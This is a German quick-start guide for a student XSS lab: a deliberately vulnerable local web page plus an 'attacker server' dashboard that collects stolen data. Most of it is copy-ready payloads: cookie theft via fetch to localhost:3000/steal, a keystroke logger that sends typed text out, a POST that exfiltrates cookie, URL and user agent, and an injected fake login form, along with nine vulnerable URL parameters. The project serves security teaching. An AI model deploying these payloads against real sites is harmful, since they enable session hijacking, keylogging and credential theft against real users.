# XSS Projekt - Quick Start Guide

## Schritt 1: Server starten

### Automatisch (Windows):
Einfach doppelklicken: `start-all.bat`

### Manuell:

**Terminal 1 - XSS Webseite:**
```bash
cd "d:\Studium\Semester 3\cybersec\Beispiel\XSS_Projekt\src"
python -m http.server 8080
```

**Terminal 2 - Attacker Server:**
```bash
cd "d:\Studium\Semester 3\cybersec\Beispiel\XSS_Projekt\attacker-server"
npm install
npm start
```

## Schritt 2: Dashboard öffnen

Browser öffnen: `http://localhost:3000/dashboard`

Das Dashboard zeigt alle gestohlenen Daten in Echtzeit an.

## Schritt 3: XSS Angriffe testen

### Test 1: Cookie-Diebstahl via Suchfeld

1. Öffne: `http://localhost:8080/index.html`
2. Gib im Suchfeld ein:
   ```html
   <img src=x onerror="fetch('http://localhost:3000/steal?c='+document.cookie)">
   ```
3. Drücke "Suchen"
4. Schaue im Dashboard - die Cookies wurden gestohlen!

### Test 2: Cookie-Diebstahl via URL

Öffne direkt diese URL im Browser:
```
http://localhost:8080/index.html?search=<img src=x onerror="fetch('http://localhost:3000/steal?c='+document.cookie)">
```

### Test 3: Newsletter mit E-Mail-Payload

1. Öffne: `http://localhost:8080/index.html`
2. Scrolle zum Newsletter
3. Gib ein:
   ```html
   test@test.de<img src=x onerror="fetch('http://localhost:3000/steal?c='+document.cookie)">
   ```
4. Klicke "Anmelden"

### Test 4: Keylogger

1. Verwende Payload:
   ```html
   <img src=x onerror="var k='';document.onkeypress=function(e){k+=e.key;if(k.length>10){fetch('http://localhost:3000/keys?d='+k);k=''}}">
   ```
2. Tippe etwas auf der Seite
3. Nach 10 Zeichen erscheinen die Tastatureingaben im Dashboard

### Test 5: Vollständiger Datendiebstahl (POST)

```html
<img src=x onerror="fetch('http://localhost:3000/steal',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({c:document.cookie,u:location.href,a:navigator.userAgent})})">
```

## Schritt 4: Verschiedene Injection Points testen

Die Webseite hat 9 verschiedene XSS-Vulnerabilities:

### 1. Search (?search=)
```
http://localhost:8080/index.html?search=PAYLOAD
```

### 2. Username (?username=)
```
http://localhost:8080/index.html?username=PAYLOAD
```

### 3. Promo (?promo=)
```
http://localhost:8080/index.html?promo=PAYLOAD
```

### 4. Error (?error=)
```
http://localhost:8080/index.html?error=PAYLOAD
```

### 5. Filter (?filter=)
```
http://localhost:8080/index.html?filter=PAYLOAD
```

### 6. Review (?reviewer=X&review=)
```
http://localhost:8080/index.html?reviewer=Hacker&review=PAYLOAD
```

### 7. Email (?email=)
```
http://localhost:8080/index.html?email=PAYLOAD
```

### 8. Contact (?contact_name=X&subject=Y&message=)
```
http://localhost:8080/contact.html?contact_name=Test&subject=Test&message=PAYLOAD
```

### 9. Voucher (?voucher=)
```
http://localhost:8080/cart.html?voucher=PAYLOAD
```

## Beispiel-URLs (Copy & Paste ready)

### Cookie-Diebstahl:
```
http://localhost:8080/index.html?search=<img src=x onerror="fetch('http://localhost:3000/steal?c='+document.cookie)">
```

### Einfacher Alert:
```
http://localhost:8080/index.html?search=<img src=x onerror="alert(document.cookie)">
```

### Phishing Attack:
```
http://localhost:8080/index.html?error=<img src=x onerror="document.body.innerHTML='<div style=\"max-width:400px;margin:100px auto;padding:40px;background:white;border-radius:8px\"><h2>Login</h2><form onsubmit=\"alert(document.getElementById(\'e\').value);return false\"><input id=\"e\" type=\"email\" placeholder=\"E-Mail\" style=\"width:100%;padding:12px;margin:10px 0;border:1px solid #ddd\"><button type=\"submit\" style=\"width:100%;background:#000;color:white;padding:12px\">Login</button></form></div>'">
```

## Dashboard Features

- ✅ Echtzeit-Anzeige aller gestohlenen Daten
- ✅ Auto-Refresh alle 5 Sekunden
- ✅ Statistiken (Gesamt, Cookies, Keylogger)
- ✅ Detaillierte Informationen (IP, User-Agent, Timestamp)
- ✅ Daten löschen Button
- ✅ Hacker-Style Design

## Troubleshooting

### Port bereits belegt?
Ändere in `attacker-server/server.js` Zeile 3:
```javascript
const port = 3001; // Statt 3000
```

### CORS Fehler?
Der Attacker Server hat CORS bereits aktiviert. Falls Probleme:
- Prüfe ob beide Server laufen
- Lösche Browser-Cache
- Verwende Incognito/Private Mode

### Cookies werden nicht angezeigt?
- Öffne Developer Tools (F12)
- Gehe zu "Application" → "Cookies"
- Prüfe ob Cookies gesetzt wurden
- Die Demo-Cookies werden automatisch gesetzt beim ersten Laden

## Stoppen der Server

- Schließe die Terminal-Fenster
- Oder drücke `Ctrl+C` in jedem Terminal

## Weitere Payloads

Siehe Dateien:
- `documents/payloads.md` - Alle Basis-Payloads
- `documents/payloads-with-server.md` - Payloads mit localhost:3000

## Sicherheit

⚠️ **NUR FÜR BILDUNGSZWECKE!**

Verwende dieses Projekt nur:
- In lokalen/kontrollierten Umgebungen
- Für Lernzwecke
- Mit ausdrücklicher Erlaubnis

NIEMALS für echte Angriffe oder auf Produktionssystemen!
